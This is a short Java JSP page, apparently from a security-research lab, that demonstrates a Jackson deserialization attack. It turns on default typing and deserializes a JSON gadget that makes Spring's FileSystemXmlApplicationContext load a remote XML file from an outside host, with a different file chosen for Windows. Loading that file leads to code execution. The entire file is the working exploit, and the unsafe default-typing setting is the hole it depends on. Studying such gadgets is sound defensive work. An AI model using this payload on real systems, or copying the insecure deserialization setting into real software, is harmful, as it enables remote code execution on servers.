<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="com.anbai.sec.entity.User" %>
<%@ page import="com.fasterxml.jackson.databind.ObjectMapper" %>
<%
    boolean isWin = System.getProperty("os.name").startsWith("Win");
    String json = "{\"host\":127.0.0.1, \"object\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://2017.su18.org/" + (isWin ? "spelwin.xml" : "spel.xml") + "\"]}";

    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    User post = mapper.readValue(json, User.class);

    out.println(post);
%>